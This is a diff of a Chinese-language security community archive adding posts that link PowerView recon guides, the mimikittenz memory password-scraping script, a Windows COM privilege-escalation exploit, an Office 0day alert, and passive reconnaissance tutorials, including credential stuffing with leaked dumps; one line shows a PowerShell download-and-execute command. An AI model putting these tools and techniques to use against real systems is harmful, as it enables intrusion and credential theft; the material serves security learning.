@@ -8,6 +8,7 @@
 - [PowerShell](#powershell)
 - [WSH Injection](#wsh-injection)
 - [Downloader](#downloader)
+- [MS Office](#ms-office)
 - [Windows COM](#windows-com)
 - [Exchange](#exchange)
 - [边界设备安全](#边界设备安全)
@@ -60,6 +61,42 @@ __#姿势#__
 
 安全技能树里推荐了不少，如果你真想感受，首先得“坏”。
 
+
+---
+
+<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-09-21:
+
+PowerView的作者HarmJ0y写的一些该脚本的使用方法，windows域的侦察方法基本上都涵盖到了。HarmJ0y是SpecterOps公司的员工，是Empire、BloodHound、PowerView、Veil-Framework、PowerSploit 这些工具的主要开发者之一。
+
+
+[https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+
+
+
+[The PowerView PowerUsage Series #1 – harmj0y](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/)
+
+
+
+[The PowerView PowerUsage Series #2 – harmj0y](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-2/)
+
+
+
+[The PowerView PowerUsage Series #3 – harmj0y](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/)
+
+
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 都是神器，服
+
+<img src="https://file.xiaomiquan.com/55/63/5563fa6232ef0292366eafe32d3885655e0633e38d449bdc9f4393ff593695e3.jpeg" width="25px"/> __Sunglassescat__: 只能看懂百分之二十[捂脸]我感觉别的不敢说，在贵圈待久了我英语阅读能力可以提高
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/55/63/5563fa6232ef0292366eafe32d3885655e0633e38d449bdc9f4393ff593695e3.jpeg" width="25px"/> __Sunglassescat__: 必须能提高[偷笑]
+
+
+...
 
 ---
 
@@ -856,6 +893,26 @@ C:\Users\Administrator>powershell IEX (New-Object Net.WebClient).DownloadString(
 
 ---
 
+<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-09-26:
+
+可以在获取指定进程内存中字符串密码的powershell脚本，原理是动态编译C#代码执行，指定进程用正则暴搜内存中的字符串。
+
+
+[mimikittenz/Invoke-mimikittenz.ps1 at master · put...](https://github.com/putterpanda/mimikittenz/blob/master/Invoke-mimikittenz.ps1)
+
+
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 咪咪系列😄
+
+
+...
+
+---
+
 
 ## WSH Injection
 
@@ -1005,6 +1062,48 @@ Cause `<package><component>` works too 😀
 ---
 
 
+## MS Office
+
+
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-13:
+
+
+__#漏洞#__
+
+最新的 Office 高级威胁攻击预警CVE-2017-8759)
+
+还有这个，自己看吧...
+
+今天漏洞大集中啊，今晚不用睡觉了。
+
+
+[【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警 - 安全客 - 有思想的安全新媒体](http://m.bobao.360.cn/learning/detail/4411.html)
+
+
+
+<img src="https://images.xiaomiquan.com/FrL3tYnCvYclyL-CYbwZkfiI-L_p?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:JLmf99jlgcli0qZWDoyhxoSzw4o=" width="50%" height="50%" align="middle"/>
+
+
+...
+
+<img src="https://file.xiaomiquan.com/cc/98/cc984e93368c4fb374909e4f3a7d739363b817c3944f1e6c90b761d9703b9b5f.jpg" width="25px"/> __Sky Lotus__: 笔记本搞没电了。。
+
+<img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: 公司内网电脑单纯的打补丁是否可行？
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: 打补丁好啊 尽快打
+
+<img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 内网为何也要打补丁？虚机形式存在且完全不与互联网连接啊
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__: 如果你自信满满，没问题啊
+
+<img src="https://file.xiaomiquan.com/1a/db/1adbf2af8762674318ce8f35cd5ccd83e520ad1436bb0acb2031848305e544e3.jpg" width="25px"/> __小峰__ replies to <img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__: 内网更重要，也就更危险。
+
+
+...
+
+---
+
 ## Windows COM
 
 <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:
@@ -1012,7 +1111,7 @@ Cause `<package><component>` works too 😀
 
 __#姿势#__
 
-  CVE-2017-0213 Windows COM 特权提升漏洞组件，实战测试 WIN10 1703 完美通过，下载地址：
+CVE-2017-0213 Windows COM 特权提升漏洞组件，实战测试 WIN10 1703 完美通过，下载地址：
 
 
 [Exploits/CVE-2017-0213 at master · WindowsExploits...](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213)
@@ -1291,6 +1390,134 @@ nslookup 随机字符串 target-ip
 
 
 ...
+
+---
+
+<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-10:
+
+
+__#基础#__
+
+ 被动信息收集之搜索引擎
+上次我们介绍了dns的信息收集之区域传输和字典爆破，这次我来介绍关于信息收集之搜索引擎方面的内容
+1、
+首先，来介绍下搜索引擎能做什么
+ ①：收集要渗透的公司的新闻动态
+ ②：重要的雇员信息，比如这个雇员是那个大佬，他的职务，所掌握的信息
+ ③：机密文档/网络拓扑：有些公司的机密文档是放在公网上的，但是隐藏了，但是会被强大的搜索引擎扫出来
+ ④：用户名和密码：有些用户名密码是默认的，这就可以通过搜索引擎查找，比如某品牌的摄像头设置了默认密码，就可以通过搜索引擎查看这个品牌的默认密码，也有一些密码可能被别人脱裤啦，放到了网上，我们也可以查到，然后利用撞库尝试密码
+ ⑤：目标系统的技术架构：搜集你要渗透的公司的技术架构，用的是什么软硬件，什么版本，有什么已经公开的漏洞
+
+介绍完了，接下来开始介绍搜索几种引擎：
+一、shodan:
+   shodan是一款功能强大的搜索引擎，但是它不爬取网页信息，只爬去各种网路设备，例如http、ftp、ssh、telent等
+   地址：
+[https://www.shodan.io](https://www.shodan.io)
+
+
+1、
+   常见filiter:
+```
+net:192.168.1.1(指定要搜索的地址)
+country:CN、US、JP（将搜索结果限定在某个国家）
+city:beijing
+port:80
+os:windows/linux
+hostname:kali
+server:apache
+```
+
+以上是常见的fliter，当然，这么强大的搜索引擎怎么可能只有这么少的filiter,大家可以在搜索框旁边的explore,点进去看看别人是怎么写filiter的
+
+2、更加详细的用法在下面这个链接：
+     
+[http://www.freebuf.com/sectool/121339.html](http://www.freebuf.com/sectool/121339.html)
+
+
+
+二、google:
+要说google是世界上最好的搜索引擎我想是没有异议的，用好google进行信息收集也是一名安全从业人员的基本功，下面介绍google
+
+1、基本使用：+
+
+```
+支付 -充值（要支付，不要充值） 
+支付 充值（支付&&充值）
+“ 支付 充值”（只含 “支付 充值”这个字段）
+intitle:电子商务
+intext:（正文）
+site:搜索的站点
+inurl:contact(网址中含有电话的)
+filetype:pdf(搜索pdf文件)
+```
+
+同样的，强大的google也不会局限于简单的filiter,大家也可以通过下面的网址学习别人的filiter是怎么写的,这个链接就是google hacking，当然也有其他的hacking,例如baidu hacking、bing hacking等，这个大家自行探索
+          
+[https://www.exploit-db.com/google-hacking-database/](https://www.exploit-db.com/google-hacking-database/)
+
+
+今天的介绍就到这里了，下一次我会将剩下的被动信息收集的内容进行收尾，在介绍一个n合一的工具：maltegoce,还有简单好用的thehavarester
+
+
+
+---
+
+<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-19:
+
+
+__#基础#__
+
+被动信息收集之收尾和工具介绍
+
+1、thehavarester:电子邮件，用户名和主机名/子域名信息收集工具，不支持代理,需要使用proxychains进行调用。调用搜索引擎以及社交媒体进行搜索
+
+常用参数
+
+```
+-d:指定搜索的域
+-l：要搜索的量
+-b:指定搜索引擎
+```
+
+注意！！当搜索量过大会触发搜索引擎的保护机制！！
+
+2、metagoofil ：基于google搜索的文档收集工具，同样需要使用proxychains进行调用，因为这个工具是基于google搜索引擎搜索的，除非设置了代理
+
+参数：
+
+```
+-d:指定域名
+-t:指定要搜索的文件
+-l:限制搜索量
+-n:限制下载文件的量
+-o：指定下载路径
+-f:输出文件名
+```
+
+同样的，当搜索量过大会触发搜索引擎的保护机制！！
+
+3、Maltego:一个十分牛逼的工具，可以将所有的被动信息收集集于一体，第一次使用需要注册，图形化工具，界面十分清晰。
+
+以上的三个工具可以查看下面这个链接获得详细信息
+
+    
+[使用Kali Linux在渗透测试中信息收集 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/articles/system/58096.html)
+
+
+
+4、被动信息收集框架：recon-ng
+
+recon-ng类似于msf，并且和msf的使用有异曲同工之妙，详细可以看下面的链接：
+   
+[web渗透信息侦察收集工具——Recon-ng - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/articles/web/7385.html)
+
+
+
+这次的收尾想了很久怎么写，但是我才疏学浅，而且这些工具需要大量的实践，限于篇幅，不能详细介绍，只能找比较好的链接，但是，分享仅仅是一个途径，真正的进步还是靠自己，以上介绍的工具使用大家一定要结合大量的实践并通过抓包了解是怎样的机制，不要只是限于工具的使用
+
+安利最近差不多看完的一本书《Python黑帽子:黑客与渗透测试编程之道》，不要仅限于成为一个脚本小子！共勉
+
+
 
 ---
 
